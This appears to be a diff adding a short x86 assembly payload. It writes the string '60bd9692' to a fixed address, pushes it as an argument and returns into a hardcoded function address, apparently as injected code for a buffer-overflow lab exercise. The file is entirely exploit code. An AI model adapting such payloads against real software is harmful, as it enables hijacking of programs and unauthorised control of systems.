@@ -1,0 +1,9 @@
+movl $0x804d2c8,%ecx
+movl $0x64623036,(%ecx)
+movl $0x32393639,0x4(%ecx)
+movl $0x00000000,0x8(%ecx)
+push %ecx
+subl $0x4,%esp
+movl $0x804953a,%eax
+push %eax
+ret
